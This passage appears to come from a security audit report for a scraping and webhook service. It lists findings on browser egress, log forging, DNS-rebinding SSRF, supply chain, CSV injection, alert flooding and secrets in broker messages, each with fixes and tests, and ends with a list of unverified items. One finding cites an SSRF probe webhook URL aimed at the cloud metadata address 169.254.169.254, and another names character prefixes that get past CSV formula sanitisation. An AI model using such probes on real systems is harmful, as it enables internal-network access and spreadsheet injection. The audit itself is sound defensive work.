| IE-10 | P3 | Browser egress (audit #2 E-4, still open) | Playwright context guard | src/scrapers/base_scraper.py:339 new_context without service_workers="block"; no route_web_socket; :458-460 guard allows on unexpected exceptions | Attacker-controlled script on an allowlisted county page or its third-party assets | Blind requests from the worker to hosts the guard would refuse | service_workers="block", a WebSocket route that validates or blocks, fail closed | Test that the context is created with service_workers="block" and that a guard exception aborts | CONFIRMED |
| IE-11 | P3 | Log forging / PII in logs (audit #2 E-5, still open) | Webhook failure excerpt; Tracerfy error body | src/workers/webhook_delivery.py:420-423 logs up to 500 chars of the tenant endpoint body without clean_text; src/scrapers/enrichment/skip_trace.py:649-652 puts 500 chars of the vendor body into TracerfyError | Tenant endpoint returning a crafted 4xx; Tracerfy echoing submitted rows | Forged log lines in Railway logs; submitted names and addresses in logs and the Celery result backend | clean_text and a 200-char cap on the excerpt; log only status plus parsed fields for Tracerfy | Test that a body with a newline yields a single log line | CONFIRMED |
| IE-12 | P3 | SSRF (DNS rebinding outside the webhook path) | safe_get / safe_get_following / safe_download_to_file | src/utils/safe_http.py:29-30,122-125,166-168,229-231 validate with resolve=True then requests resolves again at connect; the F-03 pin exists only in src/utils/pinned_http.py for webhooks | Control of DNS for a GIS endpoint, a newspaper or county host, or a CDN that the worker fetches | Time-of-check gap lets a fetched host rebind to an internal address | Mount the PinnedAdapter on the safe_http session (fixes this and IE-2 together) | Rebinding test like the webhook one against safe_get | CONFIRMED |
| IE-13 | P3 | Supply chain | Python dependency resolution | Dockerfile:34-35 pip install -r requirements.txt; top-level pins only, no lock or hashes; cmd:pip-audit resolved 94 packages at audit time | A malicious or vulnerable transitive release published between audit and build | Deployed transitive set can differ from the audited one | Generate a hashed lock (pip-compile --generate-hashes or uv lock) and install with --require-hashes; run pip-audit in CI on the lock | CI job fails on an unhashed requirement | CONFIRMED |
| IE-14 | INFO | CSV injection edge cases | sanitize_for_csv | src/api/middleware/security.py:449,477-482; cmd:probe_ssrf_csv.py full-width U+FF1D and U+FF0B, zero-width space and BOM prefixes are not prefixed | Spreadsheet that treats those characters as a formula start | None known; not executed in Excel, Sheets or LibreOffice by this leaf | Optionally NFKC-normalize the probe and strip U+200B / U+FEFF before the trigger check | Unit test over those prefixes | CONFIRMED |
| IE-15 | INFO | Ops alert flooding | Blocked webhook destination | src/workers/webhook_delivery.py:279-293 calls send_ops_alert keyed by job_id; src/workers/ops_alerts.py:28-46 cooldown is per (kind, key); cmd:probe_http.py a webhook_url of https://169.254.169.254/latest saved with 200 | Business-plan tenant | One ops email per completed job to the operator inbox, up to the jobs zone rate | Key the cooldown on user_id or config_id, and refuse literal private IPs at save time | Test two blocked jobs of one config send one alert | CONFIRMED |
| IE-16 | INFO | Secret handling | Webhook URL as a Celery argument | src/workers/tasks.py:2494 and src/workers/scheduler_helpers/dialer.py:332 pass the catch-hook URL in deliver_job_webhook.delay args, while generic_webhook.py:24-26 says the transport re-reads it from the DB | Read access to the Redis broker | Customer catch-hook URLs (capability secrets) sit in broker messages | Pass config_id and re-read the URL in the task | Test that the task signature carries no URL | CONFIRMED |

## Not verified

- Production behavior of any finding: this leaf sent no production requests. The per-request rotation of the Railway peer rests on the code comment at `auth_helpers/password.py:410-416` and audit #2's live measurement; POST probes to production are outside this leaf's rules.
- Railway edge request-body limits (IE-7) and whether Railway's egress routes to any internal or metadata address that IE-2 / IE-12 could reach. Railway exposes no documented instance metadata service; internal `*.railway.internal` services were not enumerated.
- Whether any newspaper, county or CDN page the workers fetch today carries a backslash URL (IE-2 needs one); only the code paths were traced.
- Spreadsheet behavior for full-width and zero-width prefixes (IE-14): nothing was opened in Excel, Google Sheets or LibreOffice.
- Zapier to Google Sheets formula evaluation (IE-9) was not exercised end to end; it rests on audit #2's reading of the Sheets USER_ENTERED behavior.
- `pip-audit` resolved on Windows, so Linux-only packages (uvloop from `uvicorn[standard]`) were not audited; the production image may also resolve newer transitive versions (IE-13).
- Alembic migrations and `scripts/` were not reviewed for SQL construction; neither is reachable from a request.
- The Playwright path of the IE-2 differential: Chromium canonicalizes `\` to `/` before the route guard sees `request.url`, so it is believed unaffected, but that was not run.
- Webhook delivery through the Celery task itself (`deliver_job_webhook.apply`) was not run, because the blocked path calls `send_ops_alert`; the pinned session it uses was tested directly.
